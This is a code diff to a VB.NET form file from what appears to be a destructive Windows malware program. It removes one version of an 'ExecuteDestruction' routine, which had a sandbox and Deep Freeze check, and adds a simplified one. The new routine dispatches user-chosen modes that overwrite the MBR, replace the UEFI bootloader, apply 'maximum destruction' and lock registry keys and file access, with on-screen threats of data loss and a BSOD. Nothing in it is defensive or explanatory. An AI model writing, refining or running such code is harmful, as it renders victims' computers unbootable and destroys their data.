@@ -541,83 +541,6 @@ Public Class Form2
         Next
     End Sub
 
-    ' Function to execute different payloads based on user choice
-    Public Sub ExecuteDestruction(choice As String)
-        ' Create an instance of the ComodoAntivirusDetector class
-        Dim detector As New StupidSandboxThingsDetector()
-        ' Check if Deep Freeze is detected
-        If detector.DetectDeepFreeze() Then
-            Select Case choice
-                Case "Maximum Destruction"
-                    ' Code for maximum destruction
-                    timerLabel.Text = "It can't defend against UEFI! Executing maximum destruction!"
-                    Thread.Sleep(5000)
-                    WriteMBR()
-                    ReplaceBootx64WithBootmgfw()
-                    ApplyMaximumDestruction()
-
-                Case "Classic MBR/UEFI FEffects"
-                    ' Code for classic UEFI effects
-                    timerLabel.Text = "It can't defend against UEFI! Executing classic UEFI effects!"
-                    Thread.Sleep(5000)
-                    WriteMBR()
-                    ReplaceBootx64WithBootmgfw()
-
-                Case "Surprise Me"
-                    ' Code for less destructive surprise
-                    timerLabel.Text = "Deep Freeze user detected! Non-destructive request declined."
-
-                Case "Just Make Unusable My PC Without Destruction"
-                    ' Code for access restrictions
-                    timerLabel.Text = "Deep Freeze user detected! Non-destructive request declined."
-
-                Case Else
-                    timerLabel.Text = "Invalid choice!"
-            End Select
-        Else
-            ' Code for scenarios when Deep Freeze is not detected
-            Select Case choice
-                Case "Maximum Destruction with MBR/UEFI"
-                    ' Code for maximum destruction
-                    timerLabel.Text = "Executing maximum destruction!"
-                    Thread.Sleep(5000)
-                    WriteMBR()
-                    ReplaceBootx64WithBootmgfw()
-                    ApplyMaximumDestruction()
-
-                Case "Classic MBR/UEFI Effects"
-                    ' Code for classic UEFI effects
-                    timerLabel.Text = "Executing classic UEFI effects!"
-                    Thread.Sleep(5000)
-                    ' Write UEFI using bootmgfw from Resource1
-                    WriteMBR()
-                    ReplaceBootx64WithBootmgfw()
-
-                Case "Surprise Me"
-                    ' Code for less destructive surprise
-                    timerLabel.Text = "Surprise! Executing less destructive effects!"
-                    Thread.Sleep(5000)
-                    CreateEpicScriptFiles()
-                    LegalNotice()
-                    MessageBox.Show("To apply changes, you need to restart your computer.", "Restart Required", MessageBoxButtons.OK, MessageBoxIcon.Warning)
-                    Environment.Exit(0)
-
-                Case "Just Make Unusable My PC Without Destruction"
-                    ' Code for access restrictions
-                    timerLabel.Text = "You can't access your files anymore! You have more than 60 seconds before BSOD!"
-                    Thread.Sleep(5000)
-                    LegalNotice()
-                    ApplyAccessRestrictions()
-                    LockAllRegistryKeys()
-                    Thread.Sleep(60000)
-                    Environment.Exit(0)
-
-                Case Else
-                    timerLabel.Text = "Invalid choice!"
-            End Select
-        End If
-    End Sub
-
     ' Execute a system command
     Public Sub ExecuteCommandForm2(command As String)
         Try
@@ -714,13 +637,16 @@ Public Class Form2
     End Sub
 
     Public Function PromptUserForChoice(message As String, options As String()) As String
-        Dim choice As String = ""
-        Dim validChoice As Boolean = False
+        Dim choice As String
+        Dim validChoice As Boolean
+
+        ' Create a string to display the available options
+        Dim optionsMessage As String = "Available options: " & String.Join(", ", options) & vbCrLf & vbCrLf & message
 
         ' Loop until the user makes a valid choice or cancels
         Do While Not validChoice
-            ' Prompt the user for a choice
-            choice = InputBox(message, "User Choice", "").Trim()
+            ' Prompt the user for a choice, displaying the options
+            choice = InputBox(optionsMessage, "User Choice", "").Trim()
 
             ' Check if the user pressed Cancel or left the input blank
             If String.IsNullOrEmpty(choice) Then
@@ -742,6 +668,45 @@ Public Class Form2
 
         Return String.Empty ' This line will never be reached, but it's a safety net.
     End Function
+
+    Public Sub ExecuteDestruction(choice As String)
+        Dim normalizedChoice As String = choice.Trim().ToLowerInvariant()
+
+        Select Case normalizedChoice
+            Case "maximum destruction"
+                timerLabel.Text = "Executing maximum destruction!"
+                Thread.Sleep(5000)
+                WriteMBR()
+                ReplaceBootx64WithBootmgfw()
+                ApplyMaximumDestruction()
+
+            Case "classic mbr/uefi effects"
+                timerLabel.Text = "Executing classic MBR/UEFI effects!"
+                Thread.Sleep(5000)
+                WriteMBR()
+                ReplaceBootx64WithBootmgfw()
+
+            Case "surprise me"
+                timerLabel.Text = "Surprise! Executing less destructive effects!"
+                Thread.Sleep(5000)
+                CreateEpicScriptFiles()
+                LegalNotice()
+                MessageBox.Show("To apply changes, you need to restart your computer.", "Restart Required", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+                Environment.Exit(0)
+
+            Case "just make unusable my pc without destruction"
+                timerLabel.Text = "You can't access your files anymore! You have more than 60 seconds before BSOD!"
+                Thread.Sleep(5000)
+                LegalNotice()
+                ApplyAccessRestrictions()
+                LockAllRegistryKeys()
+                Thread.Sleep(60000)
+                Environment.Exit(0)
+
+            Case Else
+                timerLabel.Text = "Invalid choice!"
+        End Select
+    End Sub
 
     Private Sub OnCountdownComplete()
         CountDownTimer.Stop()
